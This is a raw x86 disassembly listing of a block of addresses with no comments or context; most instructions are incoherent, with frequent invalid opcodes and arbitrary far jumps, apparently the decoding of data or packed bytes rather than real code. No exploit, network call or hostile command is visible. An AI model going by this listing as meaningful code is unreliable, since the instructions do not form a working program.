  41bdd6:	arpl   WORD PTR [eax+0x178b75e3],cx
  41bddc:	pop    edx
  41bddd:	sub    al,0xe5
  41bddf:	sbb    al,0x53
  41bde1:	cmc    
  41bde2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bde3:	inc    esp
  41bde4:	xor    dl,BYTE PTR [edx-0x20]
  41bde7:	jno    0x41bd78
  41bde9:	add    ebp,DWORD PTR [ecx+eiz*2+0x1ca20786]
  41bdf0:	pusha  
  41bdf1:	push   ds
  41bdf2:	leave  
  41bdf3:	cmp    al,0xb1
  41bdf5:	cli    
  41bdf6:	outs   dx,BYTE PTR ds:[esi]
  41bdf7:	ret    
  41bdf8:	ror    esi,0x7d
  41bdfb:	dec    eax
  41bdfc:	jo     0x41bda6
  41bdfe:	cmp    dl,BYTE PTR [ebx-0x47]
  41be01:	(bad)  
  41be02:	adc    eax,0x2e990e84
  41be07:	mul    DWORD PTR [edi]
  41be09:	mov    cl,0x26
  41be0b:	mov    DWORD PTR [ecx],ecx
  41be0d:	cmp    al,0xe6
  41be0f:	add    dh,BYTE PTR [ecx+0x1605ba9f]
  41be15:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41be16:	mov    esi,edi
  41be18:	scas   al,BYTE PTR es:[edi]
  41be19:	out    0xe,al
  41be1b:	jns    0x41bdd4
  41be1d:	or     ah,BYTE PTR [esi-0x4b]
  41be20:	stos   BYTE PTR es:[edi],al
  41be21:	adc    ebp,DWORD PTR [ebx]
  41be23:	pushf  
  41be24:	push   ss
  41be25:	or     esi,ecx
  41be27:	cmp    al,0x5b
  41be29:	push   cs
  41be2a:	inc    ebp
  41be2b:	aam    0x45
  41be2d:	sub    dl,0x22
  41be30:	stos   DWORD PTR es:[edi],eax
  41be31:	dec    edx
  41be32:	dec    esp
  41be33:	aam    0xb5
  41be35:	fcmovb st,st(0)
  41be37:	jbe    0x41be25
  41be39:	jl     0x41bdcc
  41be3b:	test   ebp,edx
  41be3d:	adc    eax,0x5787bd28
  41be42:	jo     0x41be31
  41be44:	mov    ?,esp
  41be46:	std    
  41be47:	fdivr  QWORD PTR [eax]
  41be49:	fcom   DWORD PTR [edi-0x6e]
  41be4c:	sub    BYTE PTR [edi+0x66d3fc40],bl
  41be52:	inc    eax
  41be53:	ja     0x41be5e
  41be55:	enter  0xb6f2,0x49
  41be59:	mov    DWORD PTR [ebx],ecx
  41be5b:	sbb    edx,DWORD PTR [ebp-0xa3369d9]
  41be61:	dec    ebp
  41be62:	outs   dx,DWORD PTR ds:[esi]
  41be63:	jne    0x41bee1
  41be65:	fbld   TBYTE PTR [esi+esi*8-0x12]
  41be69:	or     al,0x9d
  41be6b:	or     ch,bh
  41be6d:	xor    bl,ch
  41be6f:	fld    TBYTE PTR [esi+0x48]
  41be72:	shr    DWORD PTR [esi+0x449acd84],0xe7
  41be79:	jle    0x41be45
  41be7b:	dec    edx
  41be7c:	and    dl,ch
  41be7e:	jmp    0xfe4edab7
  41be83:	bswap  eax
  41be85:	or     ecx,0x62e72760
  41be8b:	jecxz  0x41be63
  41be8d:	mov    ds:0xfac8c418,al
  41be92:	sub    BYTE PTR [eax+0x18],ah
  41be95:	mov    ebp,0x812c9310
  41be9a:	(bad)  
  41be9b:	in     al,0x6f
  41be9d:	jbe    0x41be6d
  41be9f:	out    0xb5,eax
  41bea1:	sub    ch,bl
  41bea3:	addr16 into 
  41bea5:	jae    0x41bea4
  41bea7:	jmp    FWORD PTR [ecx]
  41bea9:	rcl    BYTE PTR [edx+0x39f1acbc],1
  41beaf:	adc    al,0xf0
  41beb1:	aam    0x9b
  41beb3:	loop   0x41be52
  41beb5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41beb6:	loope  0x41bee8
  41beb8:	out    0xe8,eax
  41beba:	dec    esi
  41bebb:	mov    BYTE PTR [ecx+0x25],0x92
  41bebf:	cmp    al,0xaa
  41bec1:	jg     0x41bf28
  41bec3:	adc    bl,al
  41bec5:	test   al,0xa0
  41bec7:	popf   
  41bec8:	mov    dl,0x27
  41beca:	add    BYTE PTR [ebx+0xa],bl
  41becd:	test   al,0x3e
  41becf:	leave  
  41bed0:	push   edi
  41bed1:	mov    dh,0xb6
  41bed3:	pop    edx
  41bed4:	das    
  41bed5:	scas   al,BYTE PTR es:[edi]
  41bed6:	iret   
  41bed7:	gs xchg ecx,eax
  41bed9:	jecxz  0x41bf35
  41bedb:	icebp  
  41bedc:	pop    edx
  41bedd:	mov    ah,0x30
  41bedf:	push   es
  41bee0:	add    DWORD PTR [ecx],edi
  41bee2:	mov    ebx,0x7fea93b7
  41bee7:	adc    esi,DWORD PTR [ecx+0x56]
  41beea:	call   0xebad:0xb52d034f
  41bef1:	pop    edi
  41bef2:	sub    DWORD PTR [edi+0x49],edx
  41bef5:	js     0x41bea9
  41bef7:	popfw  
  41bef9:	ja     0x41beaf
  41befb:	jg     0x41bea9
  41befd:	xor    bh,BYTE PTR [edx+eiz*1]
  41bf00:	fidivr DWORD PTR [eax]
  41bf02:	mov    bl,0xd0
  41bf04:	mov    dl,0xeb
  41bf06:	sbb    eax,0x68731f59
  41bf0b:	sbb    ah,BYTE PTR [eax+eiz*1+0xc]
  41bf0f:	sub    esp,DWORD PTR [ebx]
  41bf11:	rcl    DWORD PTR [ebp-0x1c805321],0x87
  41bf18:	pop    ecx
  41bf19:	lock cmp cl,BYTE PTR [edx+0x58]
  41bf1d:	sti    
  41bf1e:	sbb    al,BYTE PTR [eax+0x39277269]
  41bf24:	push   ecx
  41bf25:	into   
  41bf26:	lock xchg eax,ebp
  41bf29:	sti    
  41bf2a:	sub    eax,0x8ff095af
  41bf2f:	jmp    0x2bad:0x74848efc
  41bf36:	lods   eax,DWORD PTR ds:[esi]
  41bf37:	cld    
  41bf38:	or     DWORD PTR [edi+edi*4],edx
  41bf3b:	aas    
  41bf3c:	popa   
  41bf3d:	xor    eax,0x6b98587c
  41bf42:	sub    DWORD PTR [ecx+edi*4],ecx
  41bf45:	dec    esp
  41bf46:	cmp    DWORD PTR [eax-0x3ede4cb5],0xe0a1b3c2
  41bf50:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bf51:	mov    ah,dl
  41bf53:	xor    BYTE PTR [edi+0x481b0802],0x60
  41bf5a:	mov    ebp,0xb4200a15
  41bf5f:	pop    sp
  41bf61:	les    eax,FWORD PTR [esi]
  41bf63:	pop    ss
  41bf64:	mov    bh,0xf8
  41bf66:	test   eax,0x710c0924
  41bf6b:	xlat   BYTE PTR ds:[ebx]
  41bf6c:	push   ebp
  41bf6d:	push   esi
  41bf6e:	(bad)  
  41bf70:	lods   eax,DWORD PTR ds:[esi]
  41bf71:	in     al,0xdc
  41bf73:	pop    ecx
  41bf74:	lock out dx,al
  41bf76:	shr    BYTE PTR [ecx],1
  41bf78:	dec    ebp
  41bf79:	add    eax,0xdfcec0cd
  41bf7e:	sub    esp,esp
  41bf80:	jmp    0xfe9b:0x61fc7f8a
  41bf87:	sub    eax,0x1e0ac3b7
  41bf8c:	inc    ebx
  41bf8d:	jbe    0x41c002
  41bf8f:	sub    BYTE PTR [ecx],0xc9
  41bf92:	fistp  QWORD PTR [ebx-0x725e6c6c]
  41bf98:	test   DWORD PTR [ebx+ebp*4],0xa4ab435
  41bf9f:	pop    esi
  41bfa0:	sub    BYTE PTR [edx-0x54],dl
  41bfa3:	ret    
  41bfa4:	pop    ds
  41bfa5:	pop    edi
  41bfa6:	pop    es
  41bfa7:	or     eax,DWORD PTR [ecx]
  41bfa9:	sub    bl,dl
  41bfab:	test   BYTE PTR [ecx+0x58],0x4b
  41bfaf:	loope  0x41bfe2
  41bfb1:	push   ecx
  41bfb2:	outs   dx,DWORD PTR ds:[esi]
  41bfb3:	mov    dl,0x1f
  41bfb5:	fstp   QWORD PTR [edx+0x3f]
  41bfb8:	int3   
  41bfb9:	fwait
  41bfba:	push   edi
  41bfbb:	xchg   ebx,eax
  41bfbc:	pop    ebx
  41bfbd:	mov    esi,0x8c8d0047
  41bfc2:	or     bl,BYTE PTR [eax+0x3b003272]
  41bfc8:	enter  0x850f,0x8d
  41bfcc:	hlt    
  41bfcd:	(bad)  
  41bfce:	dec    DWORD PTR [ebx+0x5e9de]
  41bfd4:	add    BYTE PTR [eax],al
  41bfd6:	mov    ebx,0x327298
  41bfdb:	mov    eax,DWORD PTR [ebp-0x4]
  41bfde:	jmp    0x41c213
  41bfe3:	mov    edi,0xc5c6c0c6
  41bfe9:	(bad)
  41bfec:	xlat   BYTE PTR ds:[ebx]
  41bfed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bfee:	inc    edx
  41bfef:	mov    ebp,0xb828294e
  41bff4:	call   0x7e523878
  41bff9:	js     0x41c073
  41bffb:	mov    ecx,0x51751114
  41c000:	mov    al,ds:0x8fea461a
  41c005:	pop    ds
  41c006:	or     esp,DWORD PTR [ebx+edi*2+0x74]
  41c00a:	stos   BYTE PTR es:[edi],al
  41c00b:	add    eax,0xf6060e
  41c010:	inc    eax
  41c011:	mov    bh,0xc3
  41c013:	and    bh,bl
  41c015:	mov    ?,esp
  41c017:	dec    esp
  41c018:	xchg   BYTE PTR [ebx-0x7aaa65a4],ch
  41c01e:	dec    edi
  41c01f:	xchg   BYTE PTR [ecx],bl
  41c021:	cmp    al,0xfc
  41c023:	pop    ss
  41c024:	mov    eax,0x5621b0b1
  41c029:	ins    DWORD PTR es:[edi],dx
  41c02a:	iret   
  41c02b:	adc    DWORD PTR [ecx+0x69],eax
  41c02e:	sub    ecx,DWORD PTR [edx-0x77]
  41c031:	mov    ebp,0xdd0a54db
  41c036:	push   0xfffffff4
  41c038:	ror    BYTE PTR [edx-0x3d863602],cl
  41c03e:	test   BYTE PTR ss:[esp+ecx*2-0x33],0x1d
  41c044:	imul   eax,DWORD PTR [edi+0x49],0x16
  41c048:	std    
  41c049:	enter  0x702b,0x14
  41c04d:	jns    0x41c00e
  41c04f:	dec    ebx
  41c050:	or     al,0x83
  41c052:	jb     0x41c095
  41c054:	lock sbb edx,edx
  41c057:	das    
  41c058:	xacquire xchg DWORD PTR ss:[ebx-0x63e97735],eax
  41c060:	mov    esi,0x6004f6c9
  41c065:	mov    esp,0xe084bd87
  41c06a:	aas    
  41c06b:	mov    edi,0x6634772b
  41c070:	add    esi,DWORD PTR [eax+0x627e6448]
  41c076:	push   ebx
  41c077:	push   ss
  41c078:	mov    ah,0x72
  41c07a:	xor    ebp,ebp
  41c07c:	ins    DWORD PTR es:[edi],dx
  41c07d:	push   ecx
  41c07e:	lods   al,BYTE PTR ds:[esi]
  41c07f:	xchg   esp,eax
  41c080:	ror    DWORD PTR gs:[edx+edi*4-0x13],1
  41c085:	pop    eax
  41c086:	retf   
  41c087:	stos   BYTE PTR es:[edi],al
  41c088:	inc    eax
  41c089:	(bad)  
  41c08a:	scas   eax,DWORD PTR es:[edi]
  41c08b:	sar    BYTE PTR ds:0xbb3388e6,0x3d
  41c092:	and    eax,0x89eabfc3
  41c097:	pop    esp
  41c098:	jmp    0x72f0:0x111dd6c1
  41c09f:	xor    eax,0x89ec6516
  41c0a4:	mov    bh,0xf1
  41c0a6:	icebp  
  41c0a7:	xor    eax,0x3bef799e
  41c0ac:	sbb    BYTE PTR [ebp-0x1a],ch
  41c0af:	jecxz  0x41c11f
  41c0b1:	bound  ebp,QWORD PTR [edi+0x35]
  41c0b4:	or     ebp,esi
  41c0b6:	retf   0xabb4
  41c0b9:	ret    0x39
  41c0bc:	mov    ecx,0xc927fe0c
  41c0c1:	bound  ebp,QWORD PTR [eax+0x24d1416]
  41c0c7:	sub    ebx,DWORD PTR [edi]
  41c0c9:	cmp    al,0xdf
  41c0cb:	pop    es
  41c0cc:	jnp    0x41c063
  41c0ce:	jg     0x41c06c
  41c0d0:	jp     0x41c0a3
  41c0d2:	addr16 popa 
  41c0d4:	xchg   esi,eax
  41c0d5:	call   edi
  41c0d7:	jg     0x41c12f
  41c0d9:	adc    DWORD PTR [ecx-0x37],ecx
  41c0dc:	mov    al,ds:0x2fe5d775
  41c0e1:	pushf  
  41c0e2:	pop    edx
  41c0e3:	pop    ss
  41c0e4:	mov    dl,0x56
  41c0e6:	scas   al,BYTE PTR es:[edi]
  41c0e7:	aaa    
  41c0e8:	pop    esi
  41c0e9:	int3   
  41c0ea:	aam    0x47
  41c0ec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c0ed:	xor    eax,0xd5cfe554
  41c0f2:	sub    BYTE PTR [edx-0x6f],0xa8
  41c0f6:	fisub  DWORD PTR [esi+0x3e]
  41c0f9:	push   eax
  41c0fa:	xor    DWORD PTR [bx+si+0x99f],0xa14ff74d
  41c103:	adc    al,0x3d
  41c105:	and    BYTE PTR [edi-0x5d],cl
  41c108:	and    bh,BYTE PTR [ebp+0x40]
  41c10b:	sti    
  41c10c:	or     DWORD PTR [edi],eax
  41c10e:	cmc    
  41c10f:	or     esi,DWORD PTR [eax]
  41c111:	jg     0x41c113
  41c113:	out    0x12,eax
  41c115:	(bad)  
  41c116:	imul   eax,DWORD PTR [edi+0x22737c3a],0xb
  41c11d:	scas   al,BYTE PTR es:[edi]
  41c11e:	cmp    bl,0x41
  41c121:	push   edx
  41c122:	lds    eax,FWORD PTR [ebx-0x5d]
  41c125:	and    al,0x98
  41c127:	retf   0x73d2
  41c12a:	or     ebp,DWORD PTR [ebx-0x231e1925]
  41c130:	stos   DWORD PTR es:[edi],eax
  41c131:	jmp    0x41c128
  41c133:	std    
  41c134:	xor    dl,dl
  41c136:	rcr    DWORD PTR [esi+0xf44344c],1
  41c13c:	jne    0x41c13e
  41c13e:	ret    0x5502
  41c141:	push   edi
  41c142:	bound  edi,QWORD PTR [esi+0x1b]
  41c145:	cli    
  41c146:	mov    bh,0x89
  41c148:	push   0xe8317a6b
  41c14d:	int    0xca
  41c14f:	les    edx,FWORD PTR [esi+esi*2]
  41c152:	xlat   BYTE PTR ds:[ebx]
  41c153:	nop
  41c154:	add    ch,BYTE PTR [esi-0x3125fb4e]
  41c15a:	mov    eax,ds:0x61576915
  41c15f:	test   al,0x36
  41c161:	out    0x76,al
  41c163:	fild   DWORD PTR [esi+0x4b]
  41c166:	cwde   
  41c167:	push   eax
  41c168:	adc    edi,esi
  41c16a:	pop    ebp
  41c16b:	add    ch,BYTE PTR [edi]
  41c16d:	aam    0x2a
  41c16f:	push   edi
  41c170:	cmp    al,0x68
  41c172:	adc    eax,0x97a9f3f1
  41c177:	call   0x5cb6:0xff0647f8
  41c17e:	ror    BYTE PTR [eax+0x3c9a73a8],cl
  41c184:	dec    edx
  41c185:	adc    al,0xc0
  41c187:	push   es
  41c188:	std    
  41c189:	stc    
  41c18a:	test   eax,0xd7943deb
  41c18f:	fild   QWORD PTR [eax+0x4ee08bfe]
  41c195:	xor    DWORD PTR [ecx+0x3b],ebp
  41c198:	imul   ebp,DWORD PTR [ebx+esi*4-0x7c69e7af],0x64
  41c1a0:	push   edi
  41c1a1:	pop    ebx
  41c1a2:	add    ch,bh
  41c1a4:	out    0x13,eax
  41c1a6:	js     0x41c223
  41c1a8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1a9:	je     0x41c168
  41c1ab:	push   ebp
  41c1ac:	popa   
  41c1ad:	sub    eax,0xa8a9e051
  41c1b2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c1b3:	sbb    eax,eax
  41c1b5:	idiv   DWORD PTR [esi-0x671cbe79]
  41c1bb:	sbb    edi,eax
  41c1bd:	push   ds
  41c1be:	gs jns 0x41c1d7
  41c1c1:	mov    cl,BYTE PTR [esi-0x78]
  41c1c4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41c1c5:	or     BYTE PTR [esi-0x3b],cl
  41c1c8:	aas    
  41c1c9:	add    esp,ebx
  41c1cb:	in     al,dx
  41c1cc:	dec    BYTE PTR [edi+0x45]
  41c1cf:	xor    al,0xd4
  41c1d1:	push   ss
  41c1d2:	popw   ss
  41c1d4:	add    DWORD PTR [esi],esi
  41c1d6:	test   DWORD PTR [ebx],0xdc63b754
  41c1dc:	mov    dh,0xa9
  41c1de:	daa    
  41c1df:	jbe    0x41c1c9
  41c1e1:	repnz dec esi
  41c1e3:	int3   
  41c1e4:	push   ebp
  41c1e5:	jae    0x41c1a8
  41c1e7:	sbb    esp,DWORD PTR [ebp+0x67]
  41c1ea:	inc    ecx
  41c1eb:	in     al,dx
  41c1ec:	aam    0x47
  41c1ee:	jmp    0x41c1f0
  41c1f0:	xchg   BYTE PTR [edx],al
  41c1f2:	xchg   DWORD PTR [ecx+0x4f],ecx
  41c1f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c1f6:	fsubr  QWORD PTR ss:[edi]
  41c1f9:	mov    ch,0x16
  41c1fb:	loop   0x41c197
  41c1fd:	hlt    
  41c1fe:	sub    esi,0xffffffac
  41c201:	adc    al,BYTE PTR [ecx+0x37a55844]
  41c207:	dec    esi
  41c208:	mov    esi,0xdadf9221
  41c20d:	(bad)  
  41c20e:	into   
  41c20f:	sbb    ah,BYTE PTR [eax]
  41c211:	mov    ebp,0x850354f
  41c216:	push   ecx
  41c217:	pop    es
  41c218:	add    eax,ebx
  41c21a:	jmp    0x41c44f
  41c21f:	cmp    al,0xc7
  41c221:	(bad)
  41c224:	rol    esp,0xc5
  41c227:	jb     0x41c1ac
  41c229:	dec    ebx
  41c22a:	pop    ebx
  41c22b:	fcomp  DWORD PTR [edi+eiz*8]
  41c22e:	rcl    DWORD PTR [eax-0x12],0x7f
  41c232:	js     0x41c244
  41c234:	jle    0x41c2ae
  41c236:	js     0x41c29b
  41c238:	xor    DWORD PTR [ecx+eiz*4-0x50d904c4],eax
  41c23f:	pusha  
  41c240:	sub    al,0x4f
  41c242:	and    BYTE PTR [edi-0x4161aafd],0x8d
  41c249:	sbb    al,0x38
  41c24b:	dec    ebx
  41c24c:	xlat   BYTE PTR ds:[ebx]
  41c24d:	(bad)  
  41c24e:	ficomp DWORD PTR [edx+eax*8]
  41c251:	ins    DWORD PTR es:[edi],dx
  41c252:	mov    cl,BYTE PTR [esi]
  41c254:	das    
  41c255:	aam    0x36
  41c257:	push   cs
  41c258:	aam    0x39
  41c25a:	or     cl,ah
  41c25c:	mov    esp,0x558cf607
  41c261:	mov    DWORD PTR [ebx+0x16],ebp
  41c264:	in     al,0x54
  41c266:	dec    esi
  41c267:	push   0xffffffb0
  41c269:	jp     0x41c29a
  41c26b:	out    0xdb,al
  41c26d:	stos   BYTE PTR es:[edi],al
  41c26e:	ret    0x4523
  41c271:	pop    ebx
  41c272:	push   es
  41c273:	adc    BYTE PTR [edx-0x47bbde6a],ah
  41c279:	nop
  41c27a:	inc    ebx
  41c27b:	mov    edi,0x9814036a
  41c280:	mov    ebp,0xf9b1aa4a
  41c285:	pop    esp
  41c286:	clc    
  41c287:	inc    esp
  41c288:	dec    ebp
  41c289:	xor    BYTE PTR [ecx-0x26],al
  41c28c:	jmp    0x41c244
  41c28e:	and    BYTE PTR [edi-0x58a1df35],al
  41c294:	adc    BYTE PTR [eax],0x69
  41c297:	sub    edx,DWORD PTR [ecx+eiz*2+0x2e]
  41c29b:	popa   
  41c29c:	out    dx,eax
  41c29d:	fs xchg ebp,eax
  41c29f:	add    edx,esi
  41c2a1:	pushf  
  41c2a2:	popf   
  41c2a3:	iret   
  41c2a4:	mov    ah,0xdb
  41c2a6:	inc    esi
  41c2a7:	fcomp  st(0)
  41c2a9:	xor    eax,0x6455af00
  41c2ae:	call   0xa0385579
  41c2b3:	fiadd  DWORD PTR [esi+ecx*8-0xd516346]
  41c2ba:	push   edi
  41c2bb:	pop    eax
  41c2bc:	push   eax
  41c2bd:	scas   al,BYTE PTR es:[edi]
  41c2be:	adc    bl,al
  41c2c0:	xchg   BYTE PTR [ebx],dl
  41c2c2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c2c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41c2c4:	(bad)  
  41c2c6:	cld    
  41c2c7:	and    al,0x71
  41c2c9:	dec    ecx
  41c2ca:	in     al,0xbd
  41c2cc:	sub    esi,DWORD PTR [eax]
  41c2ce:	inc    eax
  41c2cf:	or     BYTE PTR [ebp-0x54],al
  41c2d2:	fimul  DWORD PTR [esi+0x2da33f7]
  41c2d8:	xchg   esp,eax
  41c2d9:	pop    eax
  41c2da:	test   eax,0xb56f8c96
  41c2df:	cmp    eax,DWORD PTR [eax-0x74408fd]
  41c2e5:	lods   al,BYTE PTR ds:[esi]
  41c2e6:	pop    ds
  41c2e7:	mov    ecx,0xeefd7623
  41c2ec:	or     eax,DWORD PTR [edi]
  41c2ee:	mov    cl,BYTE PTR [ecx-0x21f098c4]
  41c2f4:	jo     0x41c2ef
  41c2f6:	iret   
  41c2f7:	jne    0x41c2fc
  41c2f9:	ret    
  41c2fa:	dec    ecx
  41c2fb:	test   BYTE PTR [edi],al
  41c2fd:	std    
  41c2fe:	cli    
  41c2ff:	add    eax,0x289b47ac
  41c304:	xchg   ebp,eax
  41c305:	fistp  WORD PTR [esi-0x6e31349e]
  41c30b:	nop
  41c30c:	pop    ds
  41c30d:	lahf   
  41c30e:	jbe    0x41c344
  41c310:	and    bh,dl
  41c312:	mov    ecx,DWORD PTR [esi+ecx*2-0x32]
  41c316:	dec    ebp
  41c317:	mov    eax,0x828f1aee
  41c31c:	pop    ss
  41c31d:	in     al,dx
  41c31e:	xlat   BYTE PTR ds:[ebx]
  41c31f:	mov    dh,0x1c
  41c321:	loope  0x41c375
  41c323:	shl    BYTE PTR [ecx+0x7f],cl
  41c326:	jmp    0x41c368
  41c328:	jns    0x41c38b
  41c32a:	das    
  41c32b:	adc    eax,0x5ab5752f
  41c330:	ret    
  41c331:	adc    eax,0x5ea4200b
  41c336:	push   ecx
  41c337:	bound  ebp,QWORD PTR [edi+0x4c]
  41c33a:	std    
  41c33b:	(bad)  
  41c33c:	stos   DWORD PTR es:[edi],eax
  41c33d:	mov    ah,0xa2
  41c33f:	into   
  41c340:	sbb    DWORD PTR [ebx-0x6e18b2e1],edi
  41c346:	xor    esp,edx
  41c348:	adc    eax,0xd59abd59
  41c34d:	test   eax,0xbbfe44a5
  41c352:	and    al,0xc1
  41c354:	push   ds
  41c355:	cmp    DWORD PTR [edx+0x69],ecx
  41c358:	and    ebp,DWORD PTR [ebp-0x2]
  41c35b:	push   esp
  41c35c:	or     eax,0x86fdea0a
  41c361:	mov    esp,0x9c88a531
  41c366:	jo     0x41c354
  41c368:	xor    al,0x78
  41c36a:	jmp    0x41c31f
  41c36c:	mov    ebp,0x9bfe375d
  41c371:	jnp    0x41c35e
  41c373:	(bad)
  41c376:	mov    bh,0x69
  41c378:	(bad)  
  41c379:	cmc    
  41c37a:	inc    edx
  41c37b:	mov    ch,0x2e
  41c37d:	jb     0x41c342
  41c37f:	push   esi
  41c380:	mov    ebx,0xd7591030
  41c385:	enter  0x7a9c,0x7c
  41c389:	lock push 0x33
  41c38c:	push   cs
  41c38d:	aad    0x24
  41c38f:	adc    DWORD PTR [ebp-0xf],esi
  41c392:	ret    0xf117
  41c395:	cmp    bh,BYTE PTR [eax-0x45808646]
  41c39b:	ret    
  41c39c:	ins    BYTE PTR es:[edi],dx
  41c39d:	jmp    0x1990:0x1939cf07
  41c3a4:	adc    DWORD PTR ds:0xa8ae6709,ebp
  41c3aa:	into   
  41c3ab:	stos   BYTE PTR es:[edi],al
  41c3ac:	fs leave 
  41c3ae:	(bad)  
  41c3af:	mov    dh,0xb8
  41c3b1:	add    bl,bl
  41c3b3:	rol    BYTE PTR [edi],0xa3
  41c3b6:	inc    ebp
  41c3b7:	sub    dl,BYTE PTR [ecx-0x50ae84b6]
  41c3bd:	push   ebp
  41c3be:	push   ebx
  41c3bf:	xchg   ebx,eax
  41c3c1:	adc    al,0x2f
  41c3c3:	xor    al,cl
  41c3c5:	out    0xf9,eax
  41c3c7:	cmp    ch,BYTE PTR [ecx]
  41c3c9:	or     dh,ah
  41c3cb:	pop    ebp
  41c3cc:	je     0x41c383
  41c3ce:	jae    0x41c3c8
  41c3d0:	xchg   ecx,eax
  41c3d1:	js     0x41c3d4
  41c3d3:	add    eax,0x1f83c7e2
  41c3d8:	aaa    
  41c3d9:	les    ecx,FWORD PTR [eax+0x64fda2f6]
  41c3df:	nop
  41c3e0:	push   esi
  41c3e1:	outs   dx,BYTE PTR ds:[esi]
  41c3e2:	addr16 (bad) 
  41c3e4:	fidiv  WORD PTR [esi-0x38]
  41c3e7:	jbe    0x41c382
  41c3e9:	popf   
  41c3ea:	lahf   
  41c3eb:	dec    esi
  41c3ec:	mov    bl,0x99
  41c3ee:	add    ch,BYTE PTR [esi-0x67176cfc]
  41c3f4:	mov    edi,0x31856073
  41c3f9:	inc    ecx
  41c3fa:	pop    edi
  41c3fb:	test   eax,0xe7c7f1fc
  41c400:	jge    0x41c444
  41c402:	inc    edi
  41c403:	xor    BYTE PTR [ebx],al
  41c405:	ja     0x41c481
  41c407:	adc    BYTE PTR [eax+0x9],al
  41c40a:	xor    cl,BYTE PTR [edi]
  41c40c:	aas    
  41c40d:	and    BYTE PTR [ecx],cl
  41c40f:	and    DWORD PTR [eax+0x104f4e3e],ebx
  41c415:	jp     0x41c46c
  41c417:	ds cs mov bl,0x6e
  41c41b:	aam    0x43
  41c41d:	pop    edx
  41c41e:	cmp    BYTE PTR [ecx],ah
  41c420:	loopne 0x41c3d8
  41c422:	jge    0x41c3c2
  41c424:	sahf   
  41c425:	jecxz  0x41c449
  41c427:	push   ds
  41c428:	leave  
  41c429:	and    al,0x6b
  41c42b:	xor    DWORD PTR [edx+0x193d30a9],esp
  41c431:	ror    DWORD PTR [ebx+0x72d0bf61],1
  41c437:	xchg   ebx,eax
  41c438:	adc    eax,0x4ee2a8c3
  41c43d:	mov    al,ds:0x36117582
  41c442:	sar    edi,cl
  41c444:	mov    edi,edx
  41c446:	clc    
  41c447:	dec    ebx
  41c448:	imul   edx,DWORD PTR [ebx+0x683117a9],0x43
  41c44f:	mov    DWORD PTR [ebp-0xc],eax
  41c452:	jmp    0x41c687
  41c457:	rol    dl,1
  41c459:	(bad)  
  41c45a:	enter  0xd6da,0xd4
  41c45e:	retf   0xb6a7
  41c461:	pop    eax
  41c462:	jp     0x41c472
  41c464:	test   DWORD PTR [ecx+0x7fec68fe],ebx
  41c46a:	js     0x41c47c
  41c46c:	jle    0x41c4e6
  41c46e:	js     0x41c442
  41c470:	int3   
  41c471:	jo     0x41c4b8
  41c473:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c474:	add    DWORD PTR [esi],ebx
  41c476:	clc    
  41c477:	add    BYTE PTR [esi-0x41],cl
  41c47a:	retf   0x8820
  41c47d:	in     eax,0x3e
  41c47f:	xchg   esi,eax
  41c480:	cmc    
  41c481:	int    0x31
  41c483:	stos   BYTE PTR es:[edi],al
  41c484:	pop    esi
  41c485:	jnp    0x41c4f5
  41c487:	fistp  DWORD PTR [ecx]
  41c489:	pop    ecx
  41c48a:	aam    0x45
  41c48c:	mov    dh,0x1e
  41c48e:	cmp    eax,0x3122e33e
  41c493:	sub    cl,BYTE PTR ds:0xe6e2c81e
  41c499:	mov    ebx,0xd40e6477
  41c49e:	call   0x3a39:0xfd1c315a
  41c4a5:	jmp    0xdfe2:0x5522e439
  41c4ac:	repz mov dh,0x5c
  41c4af:	retf   0x1322
  41c4b2:	mov    ch,0x6d
  41c4b4:	mov    al,0x2
  41c4b6:	scas   eax,DWORD PTR es:[edi]
  41c4b7:	in     eax,dx
  41c4b8:	outs   dx,DWORD PTR ds:[esi]
  41c4b9:	xchg   ebx,eax
  41c4ba:	and    ebx,DWORD PTR [esi+0xfa1e173]
  41c4c0:	cs fucom st(3)
  41c4c3:	push   0x49948962
  41c4c8:	xchg   esi,eax
  41c4c9:	aaa    
  41c4ca:	pop    edx
  41c4cb:	pop    ss
  41c4cc:	or     ebp,DWORD PTR [ecx+0x39f4d3b7]
  41c4d2:	push   ebp
  41c4d3:	retf   
  41c4d4:	shr    BYTE PTR [ebx-0x29],cl
  41c4d7:	ins    BYTE PTR es:[edi],dx
  41c4d8:	out    dx,al
  41c4d9:	jmp    0x41c4d3
  41c4db:	int    0x50
  41c4dd:	push   edx
  41c4de:	pop    esi
  41c4df:	mov    esp,0xb7b3faf6
  41c4e4:	sub    eax,0xc97ebbeb
  41c4e9:	push   ecx
  41c4ea:	ret    0x6e0e
  41c4ed:	xchg   ebp,eax
  41c4ee:	inc    ecx
  41c4ef:	call   0x6057:0xd43483ce
  41c4f6:	mov    BYTE PTR [edi+0x79],bl
  41c4f9:	or     al,0x61
  41c4fb:	call   0xa038:0x4b47af6b
  41c502:	inc    ebp
  41c503:	pop    edi
  41c504:	clc    
  41c505:	mov    esi,0x2c573f63
  41c50a:	arpl   WORD PTR [eax-0x52],ax
  41c50d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41c50e:	adc    eax,esi
  41c510:	arpl   WORD PTR [edx-0x6a],cx
  41c513:	mov    DWORD PTR [esi-0x6c],esp
  41c516:	cli    
  41c517:	xor    ah,ah
  41c519:	out    dx,eax
  41c51a:	dec    ebp
  41c51b:	mov    bl,bl
  41c51d:	aaa    
  41c51e:	dec    edi
  41c51f:	arpl   WORD PTR [ebx-0x39179f78],bx
  41c525:	sub    al,0x41
  41c527:	mov    esi,gs
  41c529:	xchg   ebx,eax
  41c52a:	jo     0x41c50e
  41c52c:	push   ecx
  41c52d:	lahf   
  41c52e:	add    DWORD PTR [eax],eax
  41c530:	or     BYTE PTR [ebx-0x53],cl
  41c533:	popa   
  41c534:	inc    edx
